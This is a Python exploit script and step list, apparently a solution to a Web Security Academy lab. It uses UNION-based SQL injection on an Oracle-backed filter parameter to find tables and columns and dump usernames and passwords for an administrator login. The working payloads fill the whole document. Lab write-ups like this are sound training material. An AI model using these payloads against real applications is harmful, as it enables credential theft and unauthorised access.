#!/usr/bin/env python3

import requests, re

URL = 'https://0a7f009904e9825780ea083600a30037.web-security-academy.net/filter'

def run():
    payload = "Lifestyle' union select USERNAME_NZZNWC|| ' : ' ||PASSWORD_YBEEKC, null from USERS_HXTXFT--"
    r = requests.get(URL, params={'category': payload})
    body = r.text
    print(f'[*] Payload: {payload}')
    print(f'[*] Status: {r.status_code}')

    if r.status_code == 500:
        print('[!] Error → SQL confirmed / bad syntax')

    if re.search(r'Congratulations|solved the lab', body):
        print('[✓] SOLVED')

    hint = re.findall(r'<p id="hint">(.*?)</p>', body)
    if hint:
        print(f'[*] Hint: {hint[0]}')

    items = re.findall(r'<t[hd]>(.*?)</t[hd]>', body)
    if items:
        print(f'[✓] Found {len(items)} list:')
    for item in items:
        clean = item.strip()
        if clean:
            print(f' → {clean}')

run()


"""
Steps to Reproduce

1. Open browser and access to this endpoint:`/filter?category=Lifestyle`
2. Determine sql injection by use this patload: `Lifestyle'--`.
3. Determine how may columns by use this patload: `Lifestyle' order by 2--` (Found 2 columns).
4. Determine which column are contain text by use this patload: `Lifestyle' union select 'hacked', 'hacked' from dual--` (Both column is contain text).
5. Determine database version by use this payload: `Lifestyle' union select banner, null from v$version--`
6. Determine database name by use this payload: `Lifestyle' union select table_name, null from all_tables--`
7. Determine 2 columns that contain username and password in table `USERS_HXTXFT` by use this payload: `Lifestyle' union select column_name, null from all_tab_columns where table_name = 'USERS_HXTXFT'--`
8. Retrieves all usernames and passwords by concatenation columns use this payload: `Lifestyle' union select USERNAME_NZZNWC|| ' : ' ||PASSWORD_YBEEKC, null from USERS_HXTXFT--`.
9. Log in as the `administrator` user.
"""